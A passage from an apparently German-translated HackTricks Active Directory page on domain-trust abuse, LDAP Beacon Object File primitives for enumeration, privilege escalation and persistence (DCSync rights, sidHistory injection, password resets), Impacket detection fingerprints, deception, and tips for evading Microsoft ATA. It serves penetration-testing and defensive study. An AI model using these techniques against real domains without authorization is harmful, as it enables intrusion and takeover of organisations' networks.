Wenn jedoch eine **Domain von der vertrauenden Domain als vertrauenswürdig eingestuft wird**, erstellt die vertrauenswürdige Domain **einen Benutzer** mit einem **vorhersehbaren Namen**, der als **Passwort das vertrauenswürdige Passwort** verwendet. Das bedeutet, dass es möglich ist, **auf einen Benutzer aus der vertrauenden Domain zuzugreifen, um in die vertrauenswürdige Domain einzudringen**, sie zu enumerieren und zu versuchen, weitere Berechtigungen zu erlangen:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in der **entgegengesetzten Richtung** des Domain Trusts erstellt wurde (was nicht sehr häufig vorkommt).

Eine weitere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, auf einem Rechner zu warten, auf den sich **ein Benutzer aus der vertrauenswürdigen Domain zugreifen kann**, um sich anschließend über **RDP** anzumelden. Der Angreifer könnte dann Code in den Prozess der RDP-Sitzung injizieren und von dort aus **auf die Ursprungsdomain des Opfers zugreifen**.\
Wenn das **Opfer außerdem seine Festplatte eingebunden hat**, könnte der Angreifer aus dem Prozess der **RDP-Sitzung** **Backdoors** im **Startup-Ordner der Festplatte** speichern. Diese Technik wird **RDPInception** genannt.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Maßnahmen zur Eindämmung des Missbrauchs von Domain Trusts

### **SID Filtering:**

- Das Risiko von Angriffen, die das Attribut SID history über Forest Trusts hinweg ausnutzen, wird durch SID Filtering reduziert, das standardmäßig für alle Inter-Forest Trusts aktiviert ist. Dies basiert auf der Annahme, dass Intra-Forest Trusts sicher sind, wobei gemäß Microsofts Einschätzung der Forest und nicht die Domain als Sicherheitsgrenze betrachtet wird.
- Es gibt jedoch einen Haken: SID Filtering kann Anwendungen und den Benutzerzugriff beeinträchtigen, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Inter-Forest Trusts stellt die Verwendung von Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domains und Server innerhalb der vertrauenden Domain oder des vertrauenden Forests zugreifen können.
- Es ist wichtig zu beachten, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder Angriffen auf das Trust-Konto schützen.

[**Weitere Informationen zu Domain Trusts auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-basierter AD-Missbrauch durch On-Host-Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-ähnliche LDAP-Primitives als x64 Beacon Object Files neu, die vollständig innerhalb eines On-Host-Implants (z. B. Adaptix C2) ausgeführt werden. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und führen anschließend `ldap <subcommand>` aus dem Beacon aus. Der gesamte Traffic verwendet den aktuellen Logon-Sicherheitskontext über LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischem Zertifikatsvertrauen, sodass weder Socks-Proxies noch Artefakte auf der Festplatte erforderlich sind.<sup>[[4]](#references)</sup>

### LDAP-Enumeration auf der Implant-Seite

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen kurze Namen bzw. OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` lesen beliebige Attribute (einschließlich Security Descriptors) sowie die Forest-/Domain-Metadaten aus `rootDSE` aus.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` zeigen Roasting-Kandidaten, Delegation-Einstellungen und vorhandene [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-Deskriptoren direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` analysieren die DACL, um Trustees, Berechtigungen (GenericAll/WriteDACL/WriteOwner/Attribut-Schreibzugriffe) und Vererbung aufzulisten, und liefern sofortige Ziele für die ACL-Privilege-Escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-Schreibprimitive für Eskalation & Persistenz

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Maschinenkonten überall dort bereitzustellen, wo OU-Berechtigungen vorhanden sind. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` übernehmen Ziele direkt, sobald Write-Property-Berechtigungen gefunden wurden.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` wandeln WriteDACL/WriteOwner auf beliebigen AD-Objekten in Passwortzurücksetzungen, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsrechte um, ohne PowerShell-/ADSI-Artefakte zu hinterlassen. `remove-*`-Gegenstücke bereinigen injizierte ACEs.

### Delegation, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Toggle) markiert ihn für AS-REP-Roasting, ohne das Passwort zu ändern.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` vom Beacon aus um. Dadurch werden Constrained-/Unconstrained-/RBCD-Angriffspfade ermöglicht und die Notwendigkeit für Remote PowerShell oder RSAT entfällt.

### sidHistory-Injection, OU-Verschiebung und Gestaltung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht so eine unauffällige Zugriffvererbung vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/die OU von Computern oder Benutzern. Dadurch kann ein Angreifer Assets in OUs verschieben, in denen bereits delegierte Rechte vorhanden sind, bevor er `set-password`, `add-groupmember` oder `add-spn` missbraucht.
- Eng begrenzte Entfernungsbefehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` usw.) ermöglichen ein schnelles Rollback, nachdem der Operator Credentials oder Persistenz erlangt hat, und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Schutzmaßnahmen

[**Erfahren Sie hier mehr darüber, wie Sie Credentials schützen.**](../stealing-credentials/credentials-protections.md)

### **Schutzmaßnahmen für den Credential-Schutz**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, Domain Admins nur die Anmeldung an Domain Controllern zu erlauben und ihre Verwendung auf anderen Hosts zu vermeiden.
- **Berechtigungen von Service Accounts**: Services sollten aus Sicherheitsgründen nicht mit Domain-Admin-(DA-)Berechtigungen ausgeführt werden.
- **Zeitliche Begrenzung von Berechtigungen**: Bei Aufgaben, die DA-Berechtigungen erfordern, sollte ihre Dauer begrenzt werden. Dies kann erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Minderung von LDAP-Relay**: Überwachen Sie die Event-IDs 2889/3074/3075 und erzwingen Sie anschließend LDAP-Signing sowie LDAPS-Channel-Binding auf DCs/Clients, um LDAP-MITM-/Relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokollbasierte Fingerprints von Impacket-Aktivitäten

Wenn Sie gängige AD-Taktiken erkennen möchten, **verlassen Sie sich nicht ausschließlich auf vom Operator kontrollierte Artefakte** wie umbenannte Binaries, Servicenamen, temporäre Batch-Dateien oder Ausgabepfade. Erstellen Sie eine Baseline dafür, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- und WMI-Datenverkehr erzeugen, und suchen Sie anschließend nach **Implementierungsbesonderheiten**, die auch dann bestehen bleiben, wenn der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` bearbeitet.<sup>[[8]](#references)</sup>

- **Kandidaten mit hoher Konfidenz als eigenständige Signale** (nach Validierung anhand Ihrer eigenen Baseline):
- Authentifiziertes DCE/RPC mit `auth_context_id = 79231 + ctx_id`
- Mit `0xff` gefülltes Padding bei der DCE/RPC-Authentifizierung
- LDAP-Kerberos-Binds, die ein rohes Kerberos-`AP-REQ` direkt in `mechToken` von SPNEGO platzieren
- SMB2/3-Negotiate-Requests mit wie ASCII aussehenden `ClientGuid`-Werten
- WMI-`IWbemLevel1Login::NTLMLogin` unter Verwendung des nicht standardmäßigen Namespace `//./root/cimv2`
- Hardcodierte Kerberos-Nonce-Werte
- **Besser als Korrelations-/Scoring-Merkmale geeignet**:
- Spärliche oder duplizierte Kerberos-Etype-Listen, ungewöhnliche/fehlende `PA-DATA` oder eine von nativem Windows abweichende Etype-Reihenfolge bei TGS-REQ
- NTLM-Type-1-Nachrichten ohne Versionsinformationen oder Type-3-Nachrichten mit Null-Hostnamen
- Rohes NTLMSSP in DCE/RPC statt SPNEGO, fehlende DCE/RPC-Verifizierungs-Trailer oder nicht übereinstimmende SPNEGO-/Kerberos-OIDs
- Mehrere dieser Merkmale vom selben Host/Benutzer innerhalb desselben Sitzungs-/Zeitfensters sind deutlich aussagekräftiger als jedes einzelne schwache Feld
- **Als Anreicherung verwenden, nicht als eigenständige Alerts**:
- Standarddateinamen, Ausgabepfade, zufällige Servicenamen, temporäre Batch-Namen, Standardnamen von Computerkonten sowie tool-spezifische HTTP-/WebDAV-/RDP-/MSSQL-Strings
- Diese lassen sich für Operatoren leicht ändern und eignen sich am besten dazu zu erklären, warum ein protokollübergreifender Cluster verdächtig ist
- **Betriebliche Hinweise**:
- Einige dieser Signale erfordern entschlüsselten Datenverkehr, [PCAP-/Zeek-Parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Sichtbarkeit auf der Serverseite
- Validieren Sie die Signale anhand von Samba-/Linux-Clients, Appliances und älterer Software, bevor Sie sie zu Alerts machen
- Entwickeln Sie Detections von Anreicherung -> Hunting -> Alerting weiter, sobald Sie Vertrauen in die Baseline aufbauen

### **Implementierung von Deception-Techniken**

- Die Implementierung von Deception umfasst das Aufstellen von Fallen, etwa Decoy-Benutzern oder -Computern, mit Eigenschaften wie nicht ablaufenden Passwörtern oder der Markierung als Trusted for Delegation. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit spezifischen Rechten oder das Hinzufügen zu Gruppen mit hohen Berechtigungen.<sup>[[2]](#references)</sup>
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Weitere Informationen zur Bereitstellung von Deception-Techniken finden Sie unter [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Erkennung von Deception**

- **Bei User Objects**: Verdächtige Indikatoren umfassen atypische ObjectSIDs, seltene Anmeldungen, Erstellungsdaten und eine geringe Anzahl fehlgeschlagener Passworteingaben.
- **Allgemeine Indikatoren**: Der Vergleich der Attribute potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können dabei helfen, solche Täuschungen zu erkennen.

### **Umgehen von Detection-Systemen**

- **Umgehung der Microsoft-ATA-Detection**:
- **Benutzeraufzählung**: Vermeiden Sie die Sitzungsaufzählung auf Domain Controllern, um eine ATA-Detection zu verhindern.
- **Ticket-Impersonation**: Die Verwendung von **aes**-Schlüsseln zur Ticketerstellung hilft, die Detection zu umgehen, da kein Downgrade auf NTLM erfolgt.
- **DCSync-Angriffe**: Es wird empfohlen, diese von einem Nicht-Domain-Controller auszuführen, um eine ATA-Detection zu vermeiden, da die direkte Ausführung von einem Domain Controller Alerts auslöst.

## References

- [1] [Ein Leitfaden zum Angriff auf Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Trusts für Deception in Active Directory fälschen](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Vom Domain Admin zum Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP-BOF-Sammlung – In-Memory-LDAP-Toolkit für die Active-Directory-Ausnutzung](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM-Hashes als Wordlist einsetzen](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket analysieren](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon – Onelogon: Übernahme von Active-Directory-Konten über Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft – Verwalten der Änderungen an Netlogon-Secure-Channel-Verbindungen im Zusammenhang mit CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Eine Reise zu vergessenen Null-Session- und MS-RPC-Schnittstellen](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 4) – Forschung zur Umgehung des SID-Filters](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 5) – Golden-GMSA-Trust-Angriff – vom Child zur Parent-Domain](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 6) – Schema-Change-Trust-Angriff – vom Child zur Parent-Domain](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Von DA zu EA mit ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [In 5 Minuten von den Administratoren einer Child-Domain zu Enterprise Admins eskalieren durch den Missbrauch von AD CS – eine Fortsetzung](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ein ACE im Ärmel: Entwurf von Active-Directory-DACL-Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Quellcode des NetExec-pre2k-Moduls](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema – Attribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf – HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
